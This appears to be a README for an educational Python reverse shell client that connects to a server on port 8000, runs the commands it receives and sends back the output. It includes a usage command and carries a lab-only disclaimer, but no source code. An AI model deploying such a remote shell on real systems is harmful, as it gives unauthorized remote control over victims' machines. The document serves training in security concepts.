# reverseShell.py
Simple reverse shell client that connects to a TCP server on port 8000, executes received commands, and sends back the output.

reverseShell.py is a basic reverse shell client. It connects to a TCP
server on port 8000, receives commands, executes them locally, and sends the
output back to the server. It demonstrates the core idea behind reverse
shells and simple command-and-control agents.

⚠️ Offensive tool – for lab and educational use only.

Features

Connects back to a configurable server IP on TCP port 8000

Sends an initial banner string to identify itself

Receives commands over the socket

Executes commands locally using subprocess.Popen

Sends back the command output to the server

Closes the connection when the command exit is received

Requirements

Python 3

Install:

No extra installation required beyond Python 3.

Usage
python3 reverseShell.py <server_ip>

Example:

python3 reverseShell.py 192.168.1.10


Once connected, the server can send commands (for example via shellServer.py)
and the client will execute them and return the results.

Disclaimer

This script is provided for ethical hacking practice, training, and
understanding reverse shell concepts.
Do not deploy or run it on systems or networks without explicit, legal
authorization.
